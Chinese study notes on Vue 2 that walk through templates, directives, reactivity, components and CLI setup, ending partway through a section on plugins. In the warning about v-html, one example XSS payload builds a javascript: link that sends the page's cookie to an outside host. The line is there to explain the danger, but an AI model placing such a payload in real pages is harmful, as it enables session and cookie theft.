> 创建日期：2021
>
> 修改日期：2023-3-11

#

# 一、Vue 核心



## 1. 初识vue

1. 想要让vue工作，就必须创建一个vue实例，且要传入一个配置对象

2. 容器里面的代码怡然符合html规范，不过混入了vue语法

3. 容器里面的代码被称为vue模板

4. 使用前需引入vue.js
5. Vue实例和模板是一一对应的
6. 真实开发中只有一个Vue实例，并且配合着组件一起使用
7. {{xxx}}中的xxx要写js表达式
8. 一旦data中的数据一旦发生改变，那么页面中用到该数据的地方会自动更新

```html
<!-- hello word.html -->
<script src="../js/vue.js"></script>
<body>
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>hello {{name}}</h1>
    </div>

    <script>
        Vue.config.productionTip = false // 阻止生产提示

        // 创建Vue实例
        new Vue({
            el: '#root', // el用于指定当前Vue实例为那个容器服务
            data: { // data中用于存储数据，供el指定的容器使用
                name: '张三'
            }
        })
    </script>
</body>
```



其中的data和el有两种写法：

**el的2种写法：**

- new的时候直接配置el属性
- 先创建Vue实例，接受到后使用vm.$mount('#root')指定el的值

data的2种写法：

- 对象式
- 函数式

注意：由Vue管理的函数，不能写箭头函数，否则this指向不再是Vue了

```html
<!-- el的第1种写法 -->

<script>
new Vue({
     el: '#root', 第一种写法
     data: {
         name: 'zs'
     }
})
</script>

<!-- el的第2种写法 -->
<script>
 const v = new Vue({
            data: {
                name: 'zs'
            }
        })
 
 v.$mount('#root') 
</script>
```



```html
<!-- data的第1种写法 -->
<script>
const v = new Vue({
    data: {
         name: 'zs'
    }
})
</script>

<!-- data的第2种写法 -->
<script>
const v = new Vue({
    data(){
        return {
            name:'zs'
        }
    }
})
</script>
```



## 2. 模板语法



html 中包含了一些 JS 语法代码，语法分为两种，分别为： 

1. 插值语法（双大括号表达式） 
2. 指令（以 v-开头）



**插值语法** 

1. 功能: 用于解析标签体内容 
2. 语法: {{xxx}} ，xxxx 会作为 js 表达式解析 

```html
<div id="root">
	<h1>插值语法</h1>
	<h3>hello {{name}}</h3>
</div>
```

**指令语法** 

1. 功能: 解析标签属性、解析标签体内容、绑定事件 
2. 举例：v-bind:href = 'xxxx' ，xxxx 会作为 js 表达式被解析 
3. 说明：Vue 中有有很多的指令，此处只是用 v-bind

```html
<div id="root">
	<h1>指令语法</h1>
	<a v-bind:href="url">点击1</a>
	<a :href="url">点击2</a>
</div>
```





## 3. 数据绑定



**单向数据绑定** 

1. **语法**：v-bind:href ="xxx" 或简写为 :href 
2. **特点**：数据只能从 data 流向页面

**双向数据绑定** 

1. **语法**：v-mode:value="xxx" 或简写为 v-model="xxx"
2. **特点**：数据不仅能从 data 流向页面，还能从页面流向 dat



```html
单向数据绑定：<input type="text" v-bind:value="name"><br>
双向数据绑定：<input type="text" v-model:value="name">
```

双向数据绑定一般应用于表单元素上

v-model:value可以简写成v-model，因为其默认收集的就是value的值

```html
<!-- 简写方式 -->
简写单向数据绑定：<input type="text" :value="name"><br>
简写单向数据绑定：<input type="text" v-model="name">
```



## 4. MVVM

MVVN模型：

1. M：模型(model)：data中的数据
2. V：试图(view)：模型代码
3. VM：视图模型(ViewModel)：Vue实例

观察发现：

1. data 中的所有属性，最后都出现在了vm身上
2. vm身上所有的属性及Vue原型上所有的属性，在Vue模板中都可以直接使用



## 5. 数据代理



**Object.defineProperty**

```js
Object.defineProperty有如下配置项

enumerable: true, // 控制属性是否可以被枚举
writable: true, // 控制属性是否可以被修改
configurable: true // 控制属性是否可以被删除
```

```js
		let number = 18
        let person = {
            name: '张三',
            sex: '男'
        }
        Object.defineProperty(person, 'age', {
            // 当有人读取person的age属性时，get函数(getter)就会被调用，返回值就是age的值
            get() {
                console.log('有人读取age属性了');
                return number
            },

            // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
            set(value) {
                console.log('有人修改了age属性');
                number = value
            }
        })
```



简单的数据代理：通过一个对象代理对另一个对象中属性的操作(读/写)

```js
let obj = { x: 100 }
let obj2 = { y: 100 }

Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x
    },
    set(value) {
        obj.x = value
    }
})
```



Vue中的数据代理就是通过vm对象来代理data对象中属性的操作(读/写)

Vue中数据代理的好处是更加方便的操作data中的数据

基本原理：

1. 通过Object.defineProperty()把data对象中所有属性添加到vm上
2. 为每个添加vm上的属性指定一个getter/setter
3. 在getter/setter内部操作data中对应的属性





## 6. 事件处理v-on或@xxx

想要使用事件，语法：

使用`v-on:xxx` 或`@xxx`绑定事件，其中xxx是事件名

绑定事件的时候引号里可以写简单的语句

```html
<div id="root">
     <h2>欢迎来到：{{name}}</h2>
      <button v-on:click="showInfo1">点击1</button>
</div>
```

事件的回调需要配置在`methods`对象中，最终会在vm上

```html
<script>
new Vue({
    el: '#root',
    data: {
        name: '峡谷'
    },
    methods: {
        showInfo1() {
            alert('你好1')
        },
        showInfo2(a, event) {
            alert('你好2')
            console.log(a);
        }
    }
})
</script>
```

需要传参数的情况：使用$event预留事件对象

```html
<button @click="showInfo2(1,$event)">点击1</button>


methods: {
    showInfo2(a, event) {
        alert('你好2')
        console.log(a);
    }
}
```

**需要注意：**method中配置的函数，都是被Vue管理的函数，this的指向是vm或组件实例对象，**不能使用箭头函数**

补充：@click.nactive表示为原生click事件

## 7. 事件修饰符





| 方法    | 说明                                             |
| ------- | ------------------------------------------------ |
| prevent | 阻止默认事件                                     |
| stop    | 阻止事件冒泡                                     |
| once    | 事件只触发一次                                   |
| capture | 使用事件的捕获模式                               |
| self    | 只有event.target是当前操作的元素时才触发事件     |
| passive | 事件的默认行为立即执行，无需等待事件回调执行完毕 |

案例：

```html
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <!-- 阻止默认事件 -->
        <a href="http://www.baidu.com" v-on:click.prevent="showInfo">网站</a>

        <!-- 阻止事件冒泡 -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">点击提示</button>
        </div>

        <!-- 事件只触发一次 -->
        <button @click.once="showInfo">事件只触发一次</button>
    </div>
```

**事件修饰符可链式调用**：即阻止默认事件又冒泡



## 8. 键盘事件

常用的案件别名



| 键名 | 别名   | 备注                  |
| ---- | ------ | --------------------- |
| 回车 | enter  |                       |
| 删除 | delete | 捕获删除和退格键      |
| 退出 | esc    |                       |
| 空格 | space  |                       |
| 换行 | tab    | 必须配合`keydown`使用 |
| 上   | up     |                       |
| 下   | down   |                       |
| 左   | left   |                       |
| 右   | right  |                       |

```html
<input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
```



Vue未提供别名的案件。可以使用按键原始的Key的值去绑定，但注意要转为`小写-小写`(短横线命名)

**系统修饰键：**ctrl、alt、shift、meta：

1. 配合keyup使用：按下修饰键的同时按下其他键，随后释放其他键，事件才触发
2. 配合keydown使用：正常触发事件

也可以使用keyCode去指定具体的案件(不推荐)

**Vue自定义案件别名：**Vue.config.keyCodes.自定义键名 = 键码，可以去定制案件别名



**补充：** @keyup.ctrl.y="showInfo" 方法可绑定固定按键才触发事件





## 9. 计算属性

**定义：**要用的属性不存在，要通过已有的属性计算得来

**原理：**底层借助了**Object.defineProperty**方法提供的getter和setter

getter**初次读取**和当**依赖的数据(里面用到的属性)发生改变**时会被再次调用

优势：与methods实现相比，内部有缓存机制(复用)，效率更高，调试方便

计算属性最终会出现在vm上，直接用即可

如果计算属性要被修改，那必须写**set**函数去影响修改，且一定要引起计算时依赖的数据发生改变



插值语法

```html
<div id="root">
        姓:<input type="text" v-model="firstname"><br>
        名:<input type="text" v-model="lastname"><br>
        全名：<span>{{firstname.slice(0,3)}}-{{lastname}}</span><!-- 截取 -->
</div>
```

method方法：

```html
全名：<span>{{fullname()}}</span>
methods: {
         fullname() {
             console.log('调用了');
             return this.firstname + '-' + this.lastname
         }
}
```

计算属性方法：

```html
<div id="root">
    姓:<input type="text" v-model="firstname"><br>
    名:<input type="text" v-model="lastname"><br>
    测试<input type="text" v-model="fullname"><br>
    全名：<span>{{fullname}}</span>
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            firstname: '张',
            lastname: '三'
        },
        computed: {
            fullname: {
                get() {
                    console.log('调用了');
                    return this.firstname + '-' + this.lastname
                },
                set(value) {
                    const arr = value.split('-')
                    this.firstname = arr[0]
                    this.lastname = arr[1]
                }
            }
        }
        
        // 如果确定了不会修改计算出来的值setter，即可以简写：
        computed: {
                fullname() {
                    console.log('调用了');
                    return this.firstname + '-' + this.lastname
                }
        }
    })
</script>
```





## 10. 监视属性watch



要监视属性发生改变并作出一些回应可以使用监视属性`watch`

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视

```js
watch: {
    isHot: {
        immediate: false,// 初始化时让handler调用一下
            // 当isHot发生改变时调用
            handler(newValue, oldValue) {
            console.log('被修改了', newValue, oldValue);
        }
}
```

简写形式：

```js
watch: {
      isHot(newValue, oldValue) {
              console.log('被修改了', newValue, oldValue);
      }
}
```





另一种写法：通过vm.$watch监视

```js
// 创建玩实例之后：
vm.$watch('isHot', {
            immediate: false,// 初始化时让handler调用一下
            // 当isHot发生改变时调用
            handler(newValue, oldValue) {
                console.log('被修改了', newValue, oldValue);
            }
})
```

简写形式：

```js
 vm.$watch('isHot', function (newValue, oldValue) {
            console.log('被修改了', newValue, oldValue);
})
```



**深度监视：**

1. Vue中的watch默认不检测对象内部值的改变（一层）
2. 配置deep:true可以监测对象内部值改变（多层）

备注：

1. Vue自身可以监测对象内部值的改变，但Vuw提供的watch默认不可以
2. 使用watch时根据数据的具体结构，决定是否采用深度监视

```js
data: {
       isHot: true,
       numbers: {
              a: 1,
              b: 1
       }
},
watch:{
	numbers: {
         deep: true,
         handler(newValue, oldValue) {
                console.log('被修改了', newValue, oldValue);
         }
	}
}
```



**computed和watch之间的区别：**

1. **computed**能完成的功能，**watch**也能完成
2. **watch**能完成的**computed**不一定能完成，例如watch可以进行异步操作

**原则：**

1. 不被Vue管理的函数，最好写成普通函数，这样this才是vm或组件实例对象
2. 不被Vue管理的函数（定时器回调函数、ajax回调函数、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm或组件实例对象





## 11. 绑定样式



绑定class样式--**字符串写法**，适用于：样式的类名不确定，需动态指定

```html
<div @click="changeMood" :class="mood" class="basic">{{name}}</div><br><br><br>

data: {
        name: '张三',
        mood: 'normal',
},
 methods: {
        changeMood() {
            this.mood = 'happy'
        }
},
```



绑定class样式--**对象写法**，适用于：要绑定的样式个数不确定、名字也不确定

```html
<div @click="changeMood" :class="classArr" class="basic">{{name}}</div>

data: {
        name: '张三',
        classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
},
methods: {
        changeMood() {
            const arr = ['happy', 'sad', 'normal']
            const index = Math.floor(Math.random() * 3)
            this.mood = arr[index]
        }
},
```



绑定class样式--**对象写法**，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用

```html
<div @click="changeMood" :class="classObj" class="basic">{{name}}</div><br><br><br>

data: {
        name: '张三',
        classObj: {
            atguigu1: false,
            atguigu2: false
        }
},
```



## 12. 条件渲染

条件渲染分为`v-if`和`v-show`



`v-if`适用于切换频率较低的场景

特点：不展示的DOM元素直接移除

注意：可以和v-else、v-else-if一起使用，但要求结构不能被打断

```html
<h1 v-if="false">{{name}}</h1>
```

```html
<div v-if="n===1">1</div>
<div v-else-if="n===2">2</div>
<div v-else>3</div>
```



`v-show`适用于切换频率较高的场景

特点：不展示DOM元素未被移除，仅仅是使用样式隐藏掉

备注：使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到

```html
<h2 v-show="a">{{name}}</h2>
```

```html
<div v-show="n===1">1</div>
<div v-show="n===2">2</div>
<div v-show="n===3">3</div>
```



为了同时展示多个元素而使用v-if但不破坏dom结构可以使用template标签包裹

```html
<template v-if="n===1">
       <div>你好</div>
       <div>张三</div>
</template>
```



## 13. 列表渲染



遍历数组

```html
<li v-for="p in persons" :key="p.id">
      {{p.name}}-{{p.age}}
</li>

<li v-for="(p,index) in persons" :key="p.id">
      {{p.name}}-{{p.age}}
</li>

 persons: [
      { id: '001', name: '张三', age: 18 },
      { id: '002', name: '李四', age: 29 },
      { id: '003', name: '王二', age: 18 }
],
```



遍历对象

```html
<ul>
      <li v-for="(val,k) in car">
                {{val}}
      </li>
</ul>

car: {
    name: '五菱宏光',
    price: '20000',
    color: 'white'
}
```



## 14. key的原理



react、vue中的key有什么作用？（key的内部原理）

1.虚拟DOM中key的作用：

​		key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： 



2.对比规则： 

​		(1).旧虚拟DOM中找到了与新虚拟DOM相同的key： 

​				①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！ 

​				②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

​		(2).旧虚拟DOM中未找到与新虚拟DOM相同的key 创建新的真实DOM，随后渲染到到页面。 



3.用index作为key可能会引发的问题： 

1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作: 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
2. 如果结构中还包含输入类的DOM： 会产生错误DOM更新 ==> 界面有问题。

 

4.开发中如何选择key?: 

1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。 
2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示， 使用index作为key是没有问题的。



![image-20220809144658690](https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220809144658690.png)



<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220809143409775.png" alt="image-20220809143409775" style="zoom:50%;" />



<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220809143704162.png" alt="image-20220809143704162" style="zoom:50%;" />





## 15. Vue的监视数据

1. Vue会监视data中所有层次的数据

2. 如何监测对象中的数据？

​				通过setter实现监视，且要在new Vue时就要传入要监测的数据，对象中后添加的属性，Vue默认不做响应式处理

​				如果想要给后添加的属性做响应式，可使用：

```js
Vue.set(this.student, 'sex', '男') // 或
vm.$set(this.student, 'sex', '男') // 要修改数组元素第二个值填索引，第三二值
```



3. 如何监测数组中的数据？

​				通过包裹数组更新元素的方法实现，本质上做了2件事：

​				(1). 调用原生对象的方法对数组进行更新

​				(2). 重新解析模板，进而更新页面



4. 在Vue修改数组中的某个元素要使用：
   (1). `push()`、`pop()`、 `shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`

​		(2). Vue.set()或vm.$set()



**特别注意：**Vue.set()或vm.$set()不能给vm或vm的跟数据对象添加属性

```html
<div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1</button>
    	<button @click="addSex">添加性别属性，默认男</button>
    	<button @click="student.sex='未知'">修改性别属性</button>
    	<button @click="addFriend">在列表收尾添加一个朋友</button>
    	<button @click="updateFFN">修改第一个朋友的名字为张三</button>
    	<button @click="addHobby">添加一个爱好</button>
    	<button @click="updateHobby">修改第一个爱好为开车</button>
      <h3>姓名{{student.name}}</h3>
    <h3>年龄{{student.age}}</h3>
    <h3>性别{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}-{{f.age}}
        </li>
    </ul>
</div>
        <script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        data: {
            student: {
                name: 'TOM',
                age: 13,
                hobby: ['抽烟', '喝酒', '烫头'],
                friends: [
                    { name: 'jerry', age: 12, },
                    { name: 'tnoy', age: 25, }
                ]
            }
        },
        methods: {
            addSex() {
                // Vue.set(this.student, 'sex', '男')
                vm.$set(this.student, 'sex', '男')
            },
            addFriend() {
                const f = { name: 'jack', age: 50, }
                this.student.friends.unshift(f)
            },
            updateFFN() {
                this.student.friends[0].name = '张三'
            },
            addHobby() {
                this.student.hobby.push('吃饭')
            },
            updateHobby() {
                // this.student.hobby.splice(0, 1, '开车')
                // Vue.set(this.student.hobby, 0, '开车')
                this.$set(this.student.hobby, 0, '开车')
            }
        },
    })
</script> 
```








## 16. 收集表单的数据



**普通表单：**收集的是value的值，用户输入的就是value的值

```html
 账号：<input type="text" v-model="userInfo.account"> <br><br>
```



**单选框：**收集的是value的值，所以要给标签配置value值

```html
男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
```



**复选框：**没有配置value属性，name收集的就是checked(勾选or未勾选，布尔值)

​				配置了input的value：

​				(1). v-model的初始值是非数组，那么收集的就是checked(勾选or未勾选，布尔值)
​				(2). v-model的初始值是数组，那么收集的就是value组成的数组

```html
学习<input type="checkbox" v-model="userInfo.hobby" value="study">
吃饭<input type="checkbox" v-model="userInfo.hobby" value="game">
游戏<input type="checkbox" v-model="userInfo.hobby" value="eat">
```



**v-model的修饰符：**

| 方法   | 说明                     |
| ------ | ------------------------ |
| trim   | 输入首尾空格过滤         |
| number | 输入字符串转为有效的数字 |
| lazy   | 失去焦点在收集数据       |

```html
账号：<input type="text" v-model.trim="userInfo.account">
年龄：<input type="number" v-model.number="userInfo.age">
<textarea v-model.lazy="userInfo.other"></textarea>
```





## 17. 过滤器

**定义：**对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）

**注册过滤器**

```js
Vue.filter(name,callback)
new Vue{filters:{}}
```

**使用过滤器**

```html
<h3>{{time | timeFormat}}</h3> 
<h3>{{time | timeFormat | mySlice}}</h3> 
v-bind:属性 = xxx | 过滤器名
```

**注意：**

过滤器也可以接受额外参数、多个过滤器也可以串联

并没有改变原本的数据，是产生新的对应的数据



## 18. 内置指令



**v-text：**

**作用：**向其所在的节点中渲染文本内容

与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

```html
<div v-text="name"></div>
data: {
   name: 'zs'
}
```



**v-html:**

用法与v-text相同，但是支持将html结构解析

```html
<div v-html="str"></div>
data: {
   str: '<h2>你好</h2>'
}
```

注意：v-html有安全性问题！

在任何网站上动态渲染任意html是非常危险的，容易导致xss攻击

一定要在可信的内容上使用v-html，不要用在用户提交的内容上

```js
str2: '<a href=javascript:location.href="http://www.baidu.com?docment.cookie">链接</a>' 
// 将cookie发送到目标服务器了
```



**v-clock：**

本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-clock属性

使用css配合v-clock就可以解决网速慢时页面展示出{{xxx}}的问题

```html
<style>
        [v-clock] {
            display: none; 
        }
</style>

<h2 v-clock>{{name}}</h2>
```



**v-once：**

v-once所在节点在初次动态渲染后，就视为静态内容了

以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```html
<h2 v-once>初始化的n值：{{n}}</h2>
<h2 v-clock>当前的n值是：{{n}}</h2>
<button @click="n++">++</button>
```



**v-pre：**

跳过其所在节点的编译过程

可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<h2 v-pre>学vueing</h2> <!-- 写啥是啥，不再编译 -->
```





## 19. 自定义指令

指令对应的函数会在：指令与元素成功绑定时(一上来)，指令所在的模板被解析

指令定义是不加v-，使用时要加v-

语法：调用

```html
<span v-big="n"></span>
```



**函数式**：

```js
new Vue({
	directives: {
      	big(element, binding) { // element是当前的真实dom，binding是v-big="n"的用到的data里的n
           element.innerHTML = binding.value * 10
      	}
	}
})
```



**对象式：**

提供三个函数在不同的时刻调用不同的函数

```js
directives: {
                fbind: {
                    // 指令与元素成功绑定时（一上来）
                    bind(element, binding) {
                        element.value = binding.value
                    },
                    // 指令所在元素被插入页面时
                    inserted(element, binding) {
                        element.focus()
                    },
                    // 指令所在的模板被重新解析时
                    update(element, binding) {
                        element.value = binding.value
                    }
                }
            }
```



**多单词命名：**



```html
<input type="text" v-big-number:value="n">
```

```js
directives: {
      'big-number'(element, binding) {
             element.value = binding.value * 10
      }
}
```



**全局指令：**

```js
Vue.directive(指令名，配置对象) 
Vue.directive(指令名，回调函数) 
```





## 20. 生命周期

又名生命周期回调函数、生命周期函数、生命周期钩子

**解释：**Vue在关键时候帮我们调用的一些特殊名称的函数

生命周期函数的名字不可更改，但函数的具体内容自己定义

生命周期函数中的this指向是vm或组件实例对象

```js
// Vue完成模板的解析并把初识的真实DOM元素放入页面后（挂载完毕）调用mounted
mounted() {
      setInterval(() => {
           this.opacity -= 0.01
           if (this.opacity <= 0) this.opacity = 1
      }, 16);
},
```



**常用的钩子：**

1. mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
2. beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】



**关于销毁Vue实例：**

1. 销毁后借助Vue开发者工具看不到任何消息
2. 销毁后自定义事件会失效，但原生DOM事件依然有效
3. 一般不会在beforeDestroy操作数据，因为即使操作数据了，也不会再触发更新流程了

原理：

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="生命周期" style="zoom:50%;" />





# 二、组件化编程

**模块：**

1. 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件
2. 为什么: js 文件很多很复杂
3. 作用: 复用 js, 简化 js 的编写, 提高 js



**组件：**

1. 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..) 
2. 为什么: 一个界面的功能很复杂
3. 作用: 复用编码, 简化项目编码, 提高运行效率



**模块化：**当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用

**组件化：**当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用,





## 1. 使用组件



使用组件的三大步骤：定义组件、注册组件、使用组件

**1. 定义组件：**使用Vue.extend(options)创建，其中options和new Vue(options)的几乎一样，但是也有区别：

1. el不写，最终所有组件都要经过一个vm的管理，有vm中的el决定服务于那个容器
2. data必须写成函数，避免组件被复用时，数据存在引用关系

**备注：**使用template可以配置组件结构

```js
 /* 1.创建学校组件 */
        const school = Vue.extend({
            // el: '#root',
            template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">学校名</button>
            </div>
            `,
            data() {
                return {
                    schoolName: '社会',
                    address: '北京'
                }
            },
            methods: {
                showName() {
                    alert(this.schoolName)
                }
            },
        })
```

**2. 注册组件**

1. 局部组件：靠new Vue的时候传入components选项
2. 全局注册：靠Vue.component('组件名'，'组件')

```js
 /* 创建vm */
        new Vue({
            el: '#root',
            // 2.注册组件（局部组件）
            components: {
                school,
                student
            }
        })
```

```js
/* 注册全局组件 */
Vue.component('hello', hello)
```

**3.编写组件标签**

直接使用组件名的标签：`<school> </school>`

```html
<div id="root">
        <school></school>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
</div>
```



## 2. 几个注意点

**关于组件名：**

​	一个单词组成：

- 第一种写法（首字母小写）：school
- 第二种写法（首字母大写）：School

​	多个单词组成：

- 第一种写法：my-school
- 第二种写法：MySchool（需要Vue脚手架支持）

​	备注：

- 组件名尽可能回避HTML中已有的元素名称，例如h2、H2
- 可以使用name配置项指定组件在开发者工具中呈现的名字



关于组件标签：

第一种写法：`<school> </school>`

第二种写法：` </school>`，不用脚手架是，会导致后续组件不能渲染





## 3. 组件的嵌套



在一个组件里嵌套其他组件：在school里嵌套student则要在components里注册组件，且要写在其上方，使用时在父组件的模板使用

```js
const student = Vue.extend({
            template: `
            <div>
                <h2>姓名{{name}}</h2>
                <h2>年龄{{age}}</h2>  
            </div>
        `,
            data() {
                return {
                    name: 'zs',
                    age: 18
                }
            },
})

const school = Vue.extend({
            template: `
            <div>
                <h2>名称：{{name}}</h2>
                <h2>地址：{{address}}</h2>
                <student></student>
            </div>
        `,
            data() {
                return {
                    name: '风男',
                    address: '北京'
                }
            },
            components: {
                student
            }
})
```



在标准化开发流程中，通常在vm里注册app组件用于管理最上层组件，app里注册最上层组件

```js
 const app = Vue.extend({
            template: `
            <div>
                <school></school>
                <hello></hello>
            </div>`,
            components: {
                school,
                hello
            }
})
```

```js
new Vue({
            el: '#root',
            template: '<app></app>', // 优点简化容器
            // 注册组件
            components: {
                app
            }
})     
```



<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220815155717549.png" alt="image-20220815155717549"  />





## 4. VueComponent

组件本质上是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的

只需要在容器中写上对应的标签，Vue解析时会帮我们创建组件的实例对象，即Vue执行了 `new VueComponent(options)`

**特别注意：**每次调用Vue.extend，返回的都是一个全新的VueComponent

**this指向问题：**

1. 在组件配置中：data、methods中的函数、watch中的函数、computed中的函数，他们的this均是`VueComponent`实例对象
2. 在new Vue(options)配置中，data、methods中的函数、watch中的函数、computed中的函数，他们的this均是`Vue`实例对象





## 5. 内置关系

`Vue.component.prototype.__proto__===Vue.prototype`

此方法可以让组件实例对象(vc)可以访问到Vue原型上的属性、方法



<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220820215859514.png" alt="image-20220820215859514" style="zoom:50%;" />



代码实例：

```js
Vue.prototype.x = 989

        const student = Vue.extend({
            template: `
            <div>
                <h2>{{msg}}</h2>    
                <button @click="btn">点击调用的vm方法</button>
            </div>
            `,
            data() {
                return {
                    msg: '组件'
                }
            },
            methods: {
                btn() {
                    console.log(this);
                }
            },
        })

        new Vue({
            el: '#root',
            components: { student },
        })
```





## 6. 单文件组件

基本结构：

```vue
<template>
    <!-- 组件的结构 -->
    <div class="demo">
        <h2>学校名称：{{schoolName}}</h2>
        <button @click="showName">学校名</button>
    </div>
</template>

<script>
    // 组件交互相关的代码（数据、方法等）
   export default {
        name:'School',
        data() {
            return {
                schoolName: '社会',
                address: '北京'
            }
        },
        methods: {
            showName() {
                alert(this.schoolName)
            }
        },
    }
</script>

<style>
    /* 组件的样式 */
    .demo{
        background-color: pink;
    }
</style>

```







index.html

```html
<body>
    <div id="root">
        <App></App>
    </div>
    <script src="../../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
```

main.js

```js
import App from './App'

new Vue({
    el: '#root',
    components: { App }
})
```

App.vue

```vue
<template>
    <div>
        <School></School>
        <Student></Student>
    </div>
</template>

<script>
    // 引入组件
    import School from './School.vue'
    import Student from './Student.vue'
    export default {
        name:'App',
        components:{School,Student}
    }
</script>
```

School.vue

```vue
<template>
    <!-- 组件的结构 -->
    <div class="demo">
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="showName">学校名</button>
    </div>
</template>

<script>
    // 组件交互相关的代码（数据、方法等）
   export default {
        name:'School',
        data() {
            return {
                schoolName: '社会',
                address: '北京'
            }
        },
        methods: {
            showName() {
                alert(this.schoolName)
            }
        },
    }

</script>

<style>
    /* 组件的样式 */
    .demo{
        background-color: pink;
    }
</style>

```





# 三、使用脚手架



## 1. 初识脚手架

在Vue2中，**第一步**（仅第一次执行）：全局安装@vue/cli

```shell
npm install -g @vue/cli
```

切换到你**要创建项目的目录**，然后使用命令创建项目：

```shell
vue create xxxx
```

启动项目：

```shell
npm run serve
```

如出现下载缓慢请配置 npm 淘宝镜像：

```shell
npm config set registry https://registry.npm.taobao.org
```



**项目结构：**

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220821201022475.png" alt="image-20220821201022475" style="zoom: 67%;" />



**扩展：**不同版本的vue

vue.js和vue.runtime.xxx.js的区别：

1. vue.js是完整版的Vue，包含：核心功能+模板解析器
2. vue.runtime.xxx.js是运行版的Vue，只包含核心功能；没有模板解析器

因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容





## 2. vue.config.js



想要修改脚手架的一些默认配置。需要在根目录下创建vue.config.js



修改入口文件

```js
module.exports = {
  page: {
    index: {
      entry: 'src/zhangsan.js'
    }
  }
}
```

关闭语法检查：

```js
lintOnSave: false
```





## 3. ref

`ref`被用来给子组件注册引用信息(id的替代者)

**使用方式：**

```html
<h2 ref="xxx">这是dom</h2> 
<School ref="sch">这是组件实例对象</School>
```

**获取：**

```js
this.$refs.xxx
```





## 4. props

**功能：**让组件接收外部传过来的数据

**语法：**

传递数据：

```html
<Student name="李四" sex="男" :age="18"/>
```

接收数据：

```js
// 简单声明接收
props:['name','sex','age'], 
// 类型限制接收
props:{
            name:String,
            age:Number,
            sex:String
        } 
// 限制类型接收、限制必要性、指定默认值
props:{
            name:{
                type:String,
                required:true // 必须的
            },
            age:{
                type:Number,
                default:99 // 默认的
            },
            sex:{
                type:String,
                required:true
            }
        }
```



**备注：**props是只读的，Vue底层会监测你对props的修改，如果进行了修改会发出警告，若需求却是需要修改，可赋值props的内容到data中一份，去修改data中的数据

```html
<!-- App.vue -->
<Student name="李四" sex="男" :age="18"/>

<!-- Student.vue -->
<h2>{{Myage}}</h2>
<button @click="update">年龄++</button>
```

```js
data() {
      return {
           Myage:this.age // props优先解析，此处得到了App里传入的值，渲染到标签上，不是直接渲染props的
      }
},
props:['name','sex','age'], // 简单声明接收
        methods:{
            update(){
               this.Myage++
            }
}
```



## 5. mixin混合

功能，可以把多个组件共用的配置提取成一个混入对象

**提取：**

```js
// mixin.js
export const mixin = {
    methods: {
        showName() {
            alert(this.name)
        }
    },
    data(){...}
}
```

**使用：**

```js
// 引入混合
import {mixin} from '../mixin.js'

export default {
    	// 配置
        mixins:[mixin]
}
```

```js
// 全局配置
import { mixin } from './mixin'

Vue.mixin(mixin)
```





## 6. 插件

用于增强Vue，包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据

```js
// plugins.js
export default {
    install(Vue) {
        console.log('install');
        // 定义添加到Vue的全局的方法
        // 添加全局过滤器
        Vue.filter(...)
        // 添加全局指令
